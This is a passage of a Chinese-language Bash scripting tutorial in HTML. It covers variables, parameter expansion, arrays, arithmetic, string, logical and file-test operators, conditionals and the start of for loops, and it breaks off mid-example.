<table><thead><tr><th>关键字</th><th>功能</th><th>示例</th></tr></thead><tbody><tr><td>export</td><td>将变量导出为环境变量，使其对子进程可见</td><td>export VAR=val</td></tr><tr><td>env</td><td>查看当前所有的环境变量</td><td>env</td></tr><tr><td>set</td><td>显示当前Shell的所有变量（环境变量、局部变量、 Shell 函数）</td><td>set | grep VAR</td></tr><tr><td>unset</td><td>删除变量（包括环境变量），但仅影响当前Shell及子进程</td><td>unset VAR</td></tr></tbody></table>
<h5 data-id="heading-18">特殊变量</h5>
<p><strong>变量名只能包含数字、字母和下划线</strong>，因为某些包含其他字符的变量有特殊含义，这样的变量被称为<strong>特殊变量</strong></p>
<h6 data-id="heading-19">位置变量</h6>





























<table><thead><tr><th>位置变量</th><th>含义</th></tr></thead><tbody><tr><td><code>$0</code></td><td>当前脚本的文件名</td></tr><tr><td><code>$n</code></td><td>传递给脚本或函数的参数。n 为数字，表示第几个参数。例如，第一个参数是<code>$1</code>，第二个参数是<code>$2</code><br/>当<code>n&gt;9</code>时，需要加上<code>{}</code>，避免产生歧义</td></tr><tr><td><code>$#</code></td><td>传递给脚本或函数的参数个数</td></tr><tr><td><code>$*</code></td><td>传递给脚本或函数的所有参数</td></tr><tr><td><code>$@</code></td><td>传递给脚本或函数的所有参数。被双引号包含时，与<code>$*</code>不同</td></tr></tbody></table>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_">#</span><span class="bash">!/bin/bash</span>
echo "File Name: $0"
echo "First Parameter : $1"
echo "Second Parameter : $2"
echo "Quoted Values: $@"
echo "Quoted Values: $*"
echo "Total Number of Parameters : $#"
<span class="hljs-meta prompt_">
# </span><span class="bash">output</span>
<span class="hljs-meta prompt_"># </span><span class="bash">./test.sh Hello World</span>
<span class="hljs-meta prompt_"># </span><span class="bash">File Name : ./test.sh</span>
<span class="hljs-meta prompt_"># </span><span class="bash">First Parameter : Hello</span>
<span class="hljs-meta prompt_"># </span><span class="bash">Second Parameter : World</span>
<span class="hljs-meta prompt_"># </span><span class="bash">Quoted Values: Hello World</span>
<span class="hljs-meta prompt_"># </span><span class="bash">Quoted Values: Hello World</span>
<span class="hljs-meta prompt_"># </span><span class="bash">Total Number of Parameters : 2</span>
</code></pre>
<blockquote>
<p><code>$*</code>和<code>$@</code>的区别：</p>
<p>1）不被双引号包含时，都以<code>"$1" "$2" … "$n"</code>的形式输出所有参数</p>
<p>2）被双引号包含时</p>
<ul>
<li><code>"$*"</code>：将所有参数压缩为一个字符串 -&gt; <code>"$1 $2 … $n"</code></li>
<li><code>"$@"</code>：将每个参数保留为独立的字符串 -&gt; <code>"$1" "$2" … "$n"</code></li>
</ul>
<p>在编写循环处理参数的脚本时（比如遍历输入的文件列表），<strong>永远使用 "$@"</strong>，除非你非常确定你在做什么</p>
</blockquote>
<h6 data-id="heading-20">状态变量</h6>

























<table><thead><tr><th>状态变量</th><th>含义</th></tr></thead><tbody><tr><td><code>$?</code></td><td>上个命令的退出状态，或函数的返回值，非0为异常</td></tr><tr><td><code>$$</code></td><td>当前Shell进程ID。对于 Shell 脚本，就是这些脚本所在的进程ID</td></tr><tr><td><code>$!</code></td><td>上一个脚本/命令（持续运行）的PID</td></tr><tr><td><code>$_</code></td><td>上一个命令的最后一个参数</td></tr></tbody></table>
<p>退出状态指上一个命令执行后的返回结果，为一个数字。大部分命令执行成功会返回 0，失败返回 1，也有一些命令返回其他值，表示不同类型的错误</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-keyword">if</span> [[ $? != 0 ]];<span class="hljs-keyword">then</span>
  <span class="hljs-built_in">echo</span> <span class="hljs-string">"error"</span>
  <span class="hljs-built_in">exit</span> 1;
<span class="hljs-keyword">fi</span>
</code></pre>
<h6 data-id="heading-21">变量子串</h6>
<p><strong>变量子串</strong> 是指从一个变量的值中提取出一部分子字符串的操作，主要通过**参数扩展（Parameter Expansion）**实现</p>













































<table><thead><tr><th>变量子串</th><th>含义</th></tr></thead><tbody><tr><td>${#param}</td><td>统计字符长度</td></tr><tr><td>${param#word}</td><td>删除最短匹配前缀</td></tr><tr><td>${param##word}</td><td>删除最长匹配前缀</td></tr><tr><td>${param%word}</td><td>删除最短匹配后缀</td></tr><tr><td>${param%%word}</td><td>删除最长匹配后缀</td></tr><tr><td>${param:offset}</td><td>截取字符串（offset从0开始计算）</td></tr><tr><td>${param:offset:length}</td><td>截取字符串（offset从0开始计算）</td></tr><tr><td>${param/pattern/replacement}</td><td>替换第一个匹配项</td></tr><tr><td>${param//pattern/replacement}</td><td>替换所有匹配项</td></tr></tbody></table>
<pre><code class="hljs language-bash" lang="bash">param1=<span class="hljs-string">"example.txt"</span>
param2=<span class="hljs-string">"/usr/local/bin/zabbix_agentd"</span>
param3=<span class="hljs-string">"archive.tar.gz"</span>
param4=<span class="hljs-string">"archive.tar.gz"</span>
<span class="hljs-built_in">echo</span> <span class="hljs-variable">${param1#*.}</span>      <span class="hljs-comment"># 输出 "txt"</span>
<span class="hljs-built_in">echo</span> <span class="hljs-variable">${param2##*/}</span>     <span class="hljs-comment"># 输出 "zabbix_agentd"</span>
<span class="hljs-built_in">echo</span> <span class="hljs-variable">${param3%.*}</span>      <span class="hljs-comment"># 输出 "archive.tar"</span>
<span class="hljs-built_in">echo</span> <span class="hljs-variable">${param4%%.*}</span>     <span class="hljs-comment"># 输出 "archive"</span>

str=<span class="hljs-string">"apple banana apple"</span>
<span class="hljs-built_in">echo</span> <span class="hljs-variable">${str/apple/orange}</span>   <span class="hljs-comment"># 输出 "orange banana apple"</span>
<span class="hljs-built_in">echo</span> <span class="hljs-variable">${str//apple/orange}</span>  <span class="hljs-comment"># 输出 "orange banana orange"</span>
</code></pre>
<blockquote>
<p><code>basename</code>等价于<code>${dir##*/}</code>，<code>dirname</code>等价于<code>${dir%/*}</code></p>
</blockquote>
<h4 data-id="heading-22">变量扩展</h4>
<p>可以通过参数扩展（Parameter Expansion）为变量设置默认值</p>

























<table><thead><tr><th>变量扩展</th><th>含义</th></tr></thead><tbody><tr><td>${variable:-default}</td><td>如果变量未定义或为空，则使用默认值（不改变变量实际值）</td></tr><tr><td>${variable:=default}</td><td>如果变量未定义或为空，则将默认值赋值给变量</td></tr><tr><td>${variable:+alternate}</td><td>如果变量已定义且非空，则使用替代值（不改变变量实际值）</td></tr><tr><td>${variable:?message}</td><td>如果变量未定义或为空，则显示错误消息并退出脚本</td></tr></tbody></table>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>

<span class="hljs-comment"># 情况 1：变量未定义</span>
<span class="hljs-built_in">unset</span> username
<span class="hljs-built_in">echo</span> <span class="hljs-string">"Username: <span class="hljs-variable">${username:-"guest"}</span>"</span>   <span class="hljs-comment"># 输出 "Username: guest"</span>

<span class="hljs-comment"># 情况 2：变量为空</span>
username=<span class="hljs-string">""</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"Username: <span class="hljs-variable">${username:="default_user"}</span>"</span>   <span class="hljs-comment"># 输出 "Username: default_user"</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"After assignment: <span class="hljs-variable">$username</span>"</span>             <span class="hljs-comment"># 输出 "After assignment: default_user"</span>

<span class="hljs-comment"># 情况 3：变量已定义</span>
username=<span class="hljs-string">"admin"</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"Username: <span class="hljs-variable">${username:+"User exists"}</span>"</span>    <span class="hljs-comment"># 输出 "Username: User exists"</span>

<span class="hljs-comment"># 情况 4：强制检查变量是否已设置</span>
<span class="hljs-built_in">unset</span> password
<span class="hljs-built_in">echo</span> <span class="hljs-variable">${password:?"Password is required"}</span>       <span class="hljs-comment"># 输出错误并退出脚本</span>
</code></pre>
<h3 data-id="heading-23">数组</h3>
<p>Bash 仅支持<strong>一维数组</strong>，但其设计灵活：数组的大小没有限制，且下标是不连续的（稀疏数组）。数组下标从 0 开始</p>
<p>Bash 数组用括号 () 来表示，元素之间用<strong>空格</strong>（非逗号）分隔</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 常规初始化（自动索引 0, 1, 2...）</span>
colors=(red yellow <span class="hljs-string">"dark blue"</span>) 

<span class="hljs-comment"># 显式指定索引（稀疏数组，不连续）</span>
<span class="hljs-comment"># 索引为 0, 1, 9，中间空缺</span>
nums=([0]=0 [1]=1 [9]=99)
</code></pre>
<p>访问所有元素时，可以使用<code>${arr[@]}</code>或<code>${arr[*]}</code>。在<strong>不加双引号</strong>时，两者效果相同；但在<strong>双引号</strong>包裹下，差异巨大。这是 Shell 脚本中最容易产生 Bug 的地方</p>




















<table><thead><tr><th>语法</th><th>双引号包裹时行为</th><th>逻辑模型</th></tr></thead><tbody><tr><td>"${arr[@]}"</td><td><strong>保持原状</strong>。将每个数组元素作为独立的参数传递</td><td>List&lt;String&gt;</td></tr><tr><td>"${arr[*]}"</td><td><strong>合并字符串</strong>。将所有元素合并为一个长字符串，中间以第一个 IFS 字符连接（默认是空格）</td><td>String</td></tr></tbody></table>
<pre><code class="hljs language-bash" lang="bash">colors=(red yellow <span class="hljs-string">"dark blue"</span>)
</code></pre>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 测试：使用 printf 打印每个参数，验证参数个数</span>

<span class="hljs-comment"># ${arr[*]} 把所有东西粘在一起了</span>
<span class="hljs-built_in">printf</span> <span class="hljs-string">"+ %s\n"</span> <span class="hljs-string">"<span class="hljs-variable">${colors[*]}</span>"</span>
<span class="hljs-comment"># Output:</span>
<span class="hljs-comment"># + red yellow dark blue</span>

<span class="hljs-comment"># ${arr[@]} 完美保留了数组边界和内部空格</span>
<span class="hljs-built_in">printf</span> <span class="hljs-string">"+ %s\n"</span> <span class="hljs-string">"<span class="hljs-variable">${colors[@]}</span>"</span>
<span class="hljs-comment"># Output:</span>
<span class="hljs-comment"># + red</span>
<span class="hljs-comment"># + yellow</span>
<span class="hljs-comment"># + dark blue</span>
</code></pre>
<p><strong>数组操作速查表</strong></p>








































<table><thead><tr><th>操作类型</th><th>语法示例</th><th>说明</th></tr></thead><tbody><tr><td><strong>单元素读取</strong></td><td>${colors[1]}</td><td>读取索引为 1 的元素</td></tr><tr><td><strong>获取长度</strong></td><td>${#colors[@]}</td><td>数组元素的<strong>个数</strong>（不是最大下标）</td></tr><tr><td><strong>元素长度</strong></td><td>${#colors[0]}</td><td>获取第一个元素字符串的长度</td></tr><tr><td><strong>切片</strong></td><td>${colors[@]:0:2}</td><td>从索引 0 开始，取 2 个元素</td></tr><tr><td><strong>追加/修改</strong></td><td>colors+=(green)</td><td>+= 是最安全的追加方式；也可直接 colors[9]=black 赋值</td></tr><tr><td><strong>删除</strong></td><td>unset colors[1]</td><td><strong>注意</strong>：只置空该位置，数组索引不会重排（变稀疏了）</td></tr></tbody></table>
<h3 data-id="heading-24">运算符</h3>
<p>Shell 的运算符体系与其“容器”密不可分。学习具体操作符之前，必须先建立对<strong>计算容器</strong>的认知：</p>
<ul>
<li><code>(( ... ))</code>：专用于<strong>整数运算</strong>。支持 C 语言风格的运算符（+=, ++），无需转义</li>
<li><code>[[ ... ]]</code>：专用于<strong>条件判断</strong>。Bash 的关键字，支持正则和高级逻辑，比古老的<code>[ ... ]</code>更安全</li>
</ul>



































<table><thead><tr><th>语法</th><th>bash (#!/bin/bash)</th><th>sh (#!/bin/sh)</th><th>建议</th></tr></thead><tbody><tr><td><code>[..]</code></td><td>✅ 支持</td><td>✅ 支持</td><td><strong>兼容性首选</strong>，但要注意变量引用陷阱</td></tr><tr><td><code>[[..]]</code></td><td>✅ 支持 (更强大)</td><td>❌ <strong>不支持</strong></td><td><strong>Bash 推荐</strong>。功能多（正则、逻辑符），不需担心变量为空的问题</td></tr><tr><td><code>((..))</code></td><td>✅ 支持</td><td>❌ <strong>不支持</strong></td><td><strong>Bash 推荐</strong>。C 语言风格数字运算</td></tr><tr><td><code>$((..))</code></td><td>✅ 支持</td><td>✅ 支持</td><td><strong>通用推荐</strong>。所有 Shell 做数学运算取值的标准写法</td></tr></tbody></table>
<h4 data-id="heading-25">算术运算符</h4>
<p>Bash 原生<strong>仅支持整数运算</strong>。如需进行浮点数（小数）运算，必须借助 bc 或 awk。下表列出了常用的算术运算符</p>






























<table><thead><tr><th>符号</th><th>描述</th><th>备注</th></tr></thead><tbody><tr><td>+、-、*、/、%</td><td>加减乘除、取余</td><td>注意除法 10/3 结果为 3（取整）</td></tr><tr><td>**</td><td>幂运算</td><td>2**3 等于 8</td></tr><tr><td>++、--</td><td>自增/自减</td><td>val++</td></tr><tr><td>+=</td><td>累加</td><td>count+=10</td></tr></tbody></table>
<p><strong>注意：</strong></p>
<ul>
<li><strong>表达式和运算符之间要有空格</strong>，例如<code>2+2</code>必须写成 <code>2 + 2</code></li>
<li>条件表达式要放在方括号之间，并且<strong>要有空格</strong>，例如:<code>[$x==$y]</code>必须写成 <code>[ $x == $y ]</code></li>
<li>乘号(<code>*</code>)前边必须加反斜杠(<code>\</code>)才能实现乘法运算</li>
<li>完整的表达式要被 `` 包含（反引号）</li>
</ul>
<pre><code class="hljs language-bash" lang="bash">x=10
y=3

<span class="hljs-comment"># 方式一：$(( )) (推荐 - 用于计算赋值)</span>
result=$(( x * y + <span class="hljs-number">5</span> ))  
<span class="hljs-built_in">echo</span> <span class="hljs-string">"Result: <span class="hljs-variable">$result</span>"</span>

<span class="hljs-comment"># 方式二：let (推荐 - 用于纯运算)</span>
<span class="hljs-built_in">let</span> <span class="hljs-string">"x += 5"</span>  <span class="hljs-comment"># x 变为 15</span>

<span class="hljs-comment"># 方式三：(( )) (常用于循环或判断)</span>
(( x &gt; <span class="hljs-number">20</span> )) &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-string">"Too large"</span>
</code></pre>
<h4 data-id="heading-26">关系运算符</h4>
<p>在 Shell 中，比较<strong>数字</strong>和比较<strong>字符串</strong>使用的是两套完全不同的符号，切勿混用</p>








































<table><thead><tr><th>操作符 (通用)</th><th>含义</th><th>C 风格替代 (仅限 (()) )</th></tr></thead><tbody><tr><td>-eq</td><td>等于 (Equal)</td><td>==</td></tr><tr><td>-ne</td><td>不等于 (Not Equal)</td><td>!=</td></tr><tr><td>-gt</td><td>大于 (Greater Than)</td><td>&gt;</td></tr><tr><td>-lt</td><td>小于 (Less Than)</td><td>&lt;</td></tr><tr><td>-ge</td><td>大于等于</td><td>&gt;=</td></tr><tr><td>-le</td><td>小于等于</td><td>&lt;=</td></tr></tbody></table>
<pre><code class="hljs language-bash" lang="bash">a=10
b=20

<span class="hljs-comment"># 场景 1：if 条件判断 (使用中括号)</span>
<span class="hljs-keyword">if</span> [[ <span class="hljs-variable">$a</span> -lt <span class="hljs-variable">$b</span> ]]; <span class="hljs-keyword">then</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"a &lt; b"</span>
<span class="hljs-keyword">fi</span>

<span class="hljs-comment"># 场景 2：C 语言风格 (使用双括号)</span>
<span class="hljs-keyword">if</span> (( a &lt; b )); <span class="hljs-keyword">then</span>
   <span class="hljs-built_in">echo</span> <span class="hljs-string">"a &lt; b (C-style)"</span>
<span class="hljs-keyword">fi</span>
</code></pre>
<h4 data-id="heading-27">字符串运算符</h4>
<p>在进行字符串比较时，变量最好<strong>总是包裹双引号</strong><code>"$var"</code>，以防变量为空导致脚本报错</p>



































<table><thead><tr><th>操作符</th><th>含义</th><th>示例</th></tr></thead><tbody><tr><td>= / ==</td><td>字符串相等</td><td>[[ "$s1" == "$s2" ]]（推荐使用 ==）</td></tr><tr><td>!=</td><td>不相等</td><td>[[ "$s1" != "$s2" ]]</td></tr><tr><td>-z</td><td>Check if <strong>Zero</strong> (空)</td><td>[[ -z "$s" ]]（长度为0则真）</td></tr><tr><td>-n</td><td>Check if <strong>Non-zero</strong> (非空)</td><td>[[ -n "$s" ]]（长度不为0则真）</td></tr><tr><td><em>无符号</em></td><td>默认判非空</td><td>[[ "$s" ]] 等同于 -n</td></tr></tbody></table>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>

app_env=<span class="hljs-string">"dev"</span>
target_env=<span class="hljs-string">"prod"</span>
api_key=<span class="hljs-string">""</span>         <span class="hljs-comment"># 模拟一个空变量</span>
user_name=<span class="hljs-string">"admin"</span>

<span class="hljs-comment"># 字符串比对</span>
<span class="hljs-keyword">if</span> [[ <span class="hljs-string">"<span class="hljs-variable">$app_env</span>"</span> == <span class="hljs-string">"<span class="hljs-variable">$target_env</span>"</span> ]]; <span class="hljs-keyword">then</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"环境匹配，可以部署。"</span>
<span class="hljs-keyword">else</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"环境不匹配: 当前为 [<span class="hljs-variable">${app_env}</span>]，目标为 [<span class="hljs-variable">${target_env}</span>]"</span>
<span class="hljs-keyword">fi</span>

<span class="hljs-comment"># 空值与非空检测，防御性编程，检查必要配置是否存在</span>
<span class="hljs-keyword">if</span> [[ -z <span class="hljs-string">"<span class="hljs-variable">$api_key</span>"</span> ]]; <span class="hljs-keyword">then</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"[Warning] API_KEY 为空，请检查配置文件！"</span>
<span class="hljs-keyword">fi</span>

<span class="hljs-comment"># 确认用户身份存在</span>
<span class="hljs-keyword">if</span> [[ -n <span class="hljs-string">"<span class="hljs-variable">$user_name</span>"</span> ]]; <span class="hljs-keyword">then</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"当前操作用户: <span class="hljs-variable">$user_name</span> (Length: <span class="hljs-variable">${#user_name}</span>)"</span>
<span class="hljs-keyword">fi</span>
</code></pre>
<h4 data-id="heading-28">逻辑运算符</h4>
<p>Shell 脚本中的逻辑控制通常通过<code>[[...]]</code>或<strong>命令短路</strong>实现</p>

























<table><thead><tr><th>操作符</th><th>场景</th><th>说明</th></tr></thead><tbody><tr><td><code>!</code></td><td>非</td><td>[[ ! -e file ]]（文件不存在）</td></tr><tr><td><code>&amp;&amp;</code></td><td>逻辑与</td><td>[[ $a -gt 10 &amp;&amp; $b -lt 20 ]]（两边同时成立）</td></tr><tr><td><code>||</code></td><td>逻辑或</td><td>[[ $a -gt 10 || $b -lt 20 ]]（一边成立即可）</td></tr></tbody></table>
<p>在旧版 Old School<code>[...]</code>中，必须使用以下逻辑运算符，<strong>了解即可</strong></p>




















<table><thead><tr><th>运算符</th><th>说明</th><th>举例</th></tr></thead><tbody><tr><td><code>-o</code></td><td>或运算，有一个表达式为 true 则返回 true。</td><td><code>[ $a -lt 20 -o $b -gt 100 ]</code> 返回 true</td></tr><tr><td><code>-a</code></td><td>与运算，两个表达式都为 true 才返回 true。</td><td><code>[ $a -lt 20 -a $b -gt 100 ]</code> 返回 false</td></tr></tbody></table>
<pre><code class="hljs language-bash" lang="bash">x=10
y=20

<span class="hljs-built_in">echo</span> <span class="hljs-string">"x=<span class="hljs-variable">${x}</span>, y=<span class="hljs-variable">${y}</span>"</span>

<span class="hljs-keyword">if</span> [[ <span class="hljs-variable">${x}</span> -lt 100 &amp;&amp; <span class="hljs-variable">${y}</span> -gt 100 ]]
<span class="hljs-keyword">then</span>
   <span class="hljs-built_in">echo</span> <span class="hljs-string">"<span class="hljs-variable">${x}</span> -lt 100 &amp;&amp; <span class="hljs-variable">${y}</span> -gt 100 返回 true"</span>
<span class="hljs-keyword">else</span>
   <span class="hljs-built_in">echo</span> <span class="hljs-string">"<span class="hljs-variable">${x}</span> -lt 100 &amp;&amp; <span class="hljs-variable">${y}</span> -gt 100 返回 false"</span>
<span class="hljs-keyword">fi</span>

<span class="hljs-keyword">if</span> [[ <span class="hljs-variable">${x}</span> -lt 100 || <span class="hljs-variable">${y}</span> -gt 100 ]]
<span class="hljs-keyword">then</span>
   <span class="hljs-built_in">echo</span> <span class="hljs-string">"<span class="hljs-variable">${x}</span> -lt 100 || <span class="hljs-variable">${y}</span> -gt 100 返回 true"</span>
<span class="hljs-keyword">else</span>
   <span class="hljs-built_in">echo</span> <span class="hljs-string">"<span class="hljs-variable">${x}</span> -lt 100 || <span class="hljs-variable">${y}</span> -gt 100 返回 false"</span>
<span class="hljs-keyword">fi</span>

<span class="hljs-comment">#  Output:</span>
<span class="hljs-comment">#  x=10, y=20</span>
<span class="hljs-comment">#  10 -lt 100 &amp;&amp; 20 -gt 100 返回 false</span>
<span class="hljs-comment">#  10 -lt 100 || 20 -gt 100 返回 true</span>
</code></pre>
<blockquote>
<p>逻辑运算符，选新不选旧，不建议使用<code>-o</code>和<code>-a</code></p>
</blockquote>
<h4 data-id="heading-29">文件测试运算符</h4>
<p>这是 Shell 自动化运维中最强大的功能之一，用于检测文件属性</p>











































































<table><thead><tr><th>操作符</th><th>含义与检测对象</th><th>典型场景</th></tr></thead><tbody><tr><td><strong>-e</strong></td><td><strong>E</strong>xist。检测对象是否存在（包括文件、目录、特殊文件等）</td><td>最基础的判断，后续操作的大前提</td></tr><tr><td><strong>-f</strong></td><td><strong>F</strong>ile。检测是否为<strong>普通文件</strong>（排除目录、设备）</td><td>确保操作对象不是目录</td></tr><tr><td><strong>-d</strong></td><td><strong>D</strong>irectory。检测是否为<strong>目录</strong></td><td>创建日志目录前先判断是否存在</td></tr><tr><td><strong>-s</strong></td><td><strong>S</strong>ize。检测对象存在且<strong>大小不为 0</strong></td><td>判断下载的文件是否损坏或为空</td></tr><tr><td><strong>-r</strong></td><td><strong>R</strong>ead。检测当前用户是否可读</td><td>只有可读才能 grep 配置</td></tr><tr><td><strong>-w</strong></td><td><strong>W</strong>rite。检测当前用户是否可写</td><td>判断日志文件是否被 chattr 锁定</td></tr><tr><td><strong>-x</strong></td><td>E<strong>x</strong>ecute。检测当前用户是否可执行</td><td>判断脚本是否有 +x 权限</td></tr><tr><td>-b</td><td><strong>B</strong>lock。检测是否为<strong>块设备</strong>文件</td><td>挂载磁盘、检查 /dev/sda</td></tr><tr><td>-c</td><td><strong>C</strong>har。检测是否为<strong>字符设备</strong>文件</td><td>检查串口设备、/dev/null</td></tr><tr><td>-p</td><td><strong>P</strong>ipe。检测是否为<strong>命名管道</strong> (FIFO)</td><td>进程间通信检测</td></tr><tr><td>-u</td><td>S<strong>U</strong>ID。检测文件是否设置了 SUID 位</td><td>安全审计，如检查 /usr/bin/passwd</td></tr><tr><td>-g</td><td>S<strong>G</strong>ID。检测文件是否设置了 SGID 位</td><td>协作组目录权限检查</td></tr><tr><td>-k</td><td>Stic<strong>k</strong>y。检测目录是否设置了粘着位</td><td>检查 /tmp 目录权限（防误删）</td></tr></tbody></table>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>

<span class="hljs-comment"># 待检测的配置文件</span>
config_file=<span class="hljs-string">"/etc/hosts"</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"Checking config: <span class="hljs-variable">$config_file</span> ..."</span>

<span class="hljs-comment"># 第一层：先看存不存在 (-e)</span>
<span class="hljs-keyword">if</span> [[ ! -e <span class="hljs-string">"<span class="hljs-variable">$config_file</span>"</span> ]]; <span class="hljs-keyword">then</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"Error: File not found!"</span>
    <span class="hljs-built_in">exit</span> 1
<span class="hljs-keyword">fi</span>

<span class="hljs-comment"># 第二层：存在的话，判断是否为普通文件</span>
<span class="hljs-keyword">if</span> [[ ! -f <span class="hljs-string">"<span class="hljs-variable">$config_file</span>"</span> ]]; <span class="hljs-keyword">then</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"Error: This is a directory or device, not a file!"</span>
    <span class="hljs-built_in">exit</span> 1
<span class="hljs-keyword">fi</span>

<span class="hljs-comment"># 第三层：判断文件是否为空</span>
<span class="hljs-keyword">if</span> [[ ! -s <span class="hljs-string">"<span class="hljs-variable">$config_file</span>"</span> ]]; <span class="hljs-keyword">then</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"Warning: File is empty."</span>
<span class="hljs-keyword">else</span>
    <span class="hljs-comment"># 第四层：逻辑嵌套检测权限，既要存在，又要可读，且可写</span>
    <span class="hljs-keyword">if</span> [[ -r <span class="hljs-string">"<span class="hljs-variable">$config_file</span>"</span> &amp;&amp; -w <span class="hljs-string">"<span class="hljs-variable">$config_file</span>"</span> ]]; <span class="hljs-keyword">then</span>
        <span class="hljs-built_in">echo</span> <span class="hljs-string">"OK: File is healthy (Readable &amp; Writable)."</span>
    <span class="hljs-keyword">elif</span> [[ -r <span class="hljs-string">"<span class="hljs-variable">$config_file</span>"</span> ]]; <span class="hljs-keyword">then</span>
        <span class="hljs-built_in">echo</span> <span class="hljs-string">"Note: Read-only file."</span>
    <span class="hljs-keyword">else</span>
        <span class="hljs-built_in">echo</span> <span class="hljs-string">"Error: Permission denied."</span>
    <span class="hljs-keyword">fi</span>
<span class="hljs-keyword">fi</span>
</code></pre>
<h3 data-id="heading-30">流程控制</h3>
<p>任何强大的脚本都离不开<strong>逻辑判断</strong>与<strong>循环执行</strong>。Shell 提供了类 C 语言风格的流程控制，但其语法对空格和符号极其敏感</p>
<h4 data-id="heading-31">条件语句</h4>
<p>Shell 的条件判断主要依赖 if 和 case。其中 if 的判断基元建议无脑使用现代 Bash 的<code>[[ ]]</code>（而非旧式的<code>[ ]</code>），因为它能自动处理空变量且支持正则，表达式和方括号之间必须有空格</p>
<h5 data-id="heading-32">if-else</h5>
<p>最经典的条件判断。注意 if 块结束后必须跟 fi</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>

<span class="hljs-comment"># 单行极简写法（适合简单防御逻辑）</span>
[[ ! -d <span class="hljs-string">"build"</span> ]] &amp;&amp; <span class="hljs-built_in">mkdir</span> <span class="hljs-string">"build"</span>

<span class="hljs-comment"># 标准多分支写法</span>
score=85

<span class="hljs-keyword">if</span> [[ <span class="hljs-variable">$score</span> -ge 90 ]]; <span class="hljs-keyword">then</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"优秀"</span>
<span class="hljs-keyword">elif</span> [[ <span class="hljs-variable">$score</span> -ge 60 ]]; <span class="hljs-keyword">then</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"及格"</span>
<span class="hljs-keyword">else</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"不及格"</span>
<span class="hljs-keyword">fi</span>
</code></pre>
<h5 data-id="heading-33">case</h5>
<p>当你需要面对很多选项（尤其是<strong>用户交互</strong>或<strong>参数解析</strong>）时，<code>case</code>远比一堆<code>if-elif</code>优雅。它支持通配符匹配</p>
<ul>
<li><code>|</code>：分割多个模式（类似 OR）</li>
<li><code>;;</code>：结束当前块（类似 break）</li>
</ul>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/usr/bin/env bash</span>

<span class="hljs-comment"># 场景：根据后缀处理文件</span>
file_name=<span class="hljs-string">"data.tar.gz"</span>

<span class="hljs-comment"># "${file_name##*.}" 提取的是 "gz" (见变量操作章节)</span>
<span class="hljs-keyword">case</span> <span class="hljs-string">"<span class="hljs-variable">$file_name</span>"</span> <span class="hljs-keyword">in</span>
    *.tar.gz|*.tgz) 
        <span class="hljs-built_in">echo</span> <span class="hljs-string">"Decompressing with tar..."</span> 
        <span class="hljs-comment"># tar -zxvf "$file_name"</span>
        ;;
    *.zip)
        <span class="hljs-built_in">echo</span> <span class="hljs-string">"Decompressing with unzip..."</span>
        ;;
    *)
        <span class="hljs-built_in">echo</span> <span class="hljs-string">"Unknown format!"</span>
        ;;
<span class="hljs-keyword">esac</span>
</code></pre>
<blockquote>
<p>每种情况都是匹配了某个模式的表达式。<code>|</code>用来分割多个模式，<code>)</code>用来结束一个模式序列。第一个匹配上的模式对应的命令将会被执行。<code>*</code>代表任何不匹配以上给定模式的模式。命令块儿之间要用<code>;;</code>分隔</p>
</blockquote>
<h4 data-id="heading-34">循环语句</h4>
<p>Bash 提供了 for (遍历列表), while (条件循环), until (反向循环) 和 select (交互菜单) 四种机制</p>
<h5 data-id="heading-35">for循环</h5>
<p><code>for</code>与它在 C 语言中的姊妹非常像。看起来是这样：</p>
<pre><code class="hljs language-shell" lang="shell">for arg in elem1 elem2 ... elemN
do
<span class="hljs-meta prompt_">  #</span><span class="bash"><span class="hljs-comment">## 语句2</span></span>
done
</code></pre>
<p>在每次循环的过程中，<code>arg</code>依次被赋值为从<code>elem1</code>到<code>elemN</code>。这些值还可以是通配符或者<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fdenysdovhan%2Fbash-handbook%2Fblob%2Fmaster%2Ftranslations%2Fzh-CN%2FREADME.md%23%25E5%25A4%25A7%25E6%258B%25AC%25E5%258F%25B7%25E6%2589%25A9%25E5%25B1%2595" target="_blank" title="https://github.com/denysdovhan/bash-handbook/blob/master/translations/zh-CN/README.md#%E5%A4%A7%E6%8B%AC%E5%8F%B7%E6%89%A9%E5%B1%95" ref="nofollow noopener noreferrer">大括号扩展</a>。</p>
<p>当然，我们还可以把<code>for</code>循环写在一行，但这要求<code>do</code>之前要有一个分号，就像下面这样：</p>
<pre><code class="hljs language-shell" lang="shell">for i in {1..5}; do echo $i; done
</code></pre>
<p>还有，如果你觉得<code>for..in..do</code>对你来说有点奇怪，那么你也可以像 C 语言那样使用<code>for</code>，比如：</p>
<pre><code class="hljs language-shell" lang="shell">for (( i = 0; i &lt; 10; i++ )); do
  echo $i
done
</code></pre>
<p>当我们想对一个目录下的所有文件做同样的操作时，<code>for</code>就很方便了。举个例子，如果我们想把所有的<code>.bash</code>文件移动到<code>script</code>文件夹中，并给它们可执行权限，我们的脚本可以这样写：</p>
<pre><code class="hljs language-shell" lang="shell">DIR=/home/zp
for FILE in ${DIR}/*.sh; do
